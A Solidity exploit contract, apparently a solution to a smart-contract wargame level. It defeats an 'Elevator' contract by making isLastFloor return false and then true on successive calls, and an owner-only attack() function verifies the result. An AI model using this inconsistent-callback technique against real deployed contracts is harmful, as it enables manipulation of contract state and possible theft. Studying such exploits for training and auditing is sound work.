// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
    function floor() external view returns (uint256);
}

/**
 * @title BuildingExploit
 * @dev Exploits the Elevator contract by implementing isLastFloor to return different values
 * on sequential calls for the same input.
 */
contract BuildingExploit {
    address public owner;
    address public elevatorAddress;
    bool public hasBeenCalled;
    
    constructor(address _elevatorAddress) {
        owner = msg.sender;
        elevatorAddress = _elevatorAddress;
        hasBeenCalled = false;
    }
    
    /**
     * @dev This function will return different values for sequential calls with the same input
     * First call: returns false to pass the first check in the Elevator contract
     * Second call: returns true to set the top variable to true
     */
    function isLastFloor(uint256) external returns (bool) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            return false;
        } else {
            hasBeenCalled = false;
            return true;
        }
    }
    
    /**
     * @dev Call this function to execute the exploit and reach the top floor
     */
    function attack(uint256 _floor) external {
        require(msg.sender == owner, "Only owner can call this function");
        
        // Call the goTo function on the Elevator contract
        IElevator elevator = IElevator(elevatorAddress);
        elevator.goTo(_floor);
        
        // Verify if the exploit was successful
        bool isTop = elevator.top();
        uint256 currentFloor = elevator.floor();
        
        require(isTop, "Failed to reach the top floor");
        require(currentFloor == _floor, "Failed to reach the specified floor");
    }
    
    /**
     * @dev Check if the elevator has reached the top floor
     */
    function checkTop() external view returns (bool) {
        return IElevator(elevatorAddress).top();
    }
    
    /**
     * @dev Check which floor the elevator is currently on
     */
    function checkFloor() external view returns (uint256) {
        return IElevator(elevatorAddress).floor();
    }
}
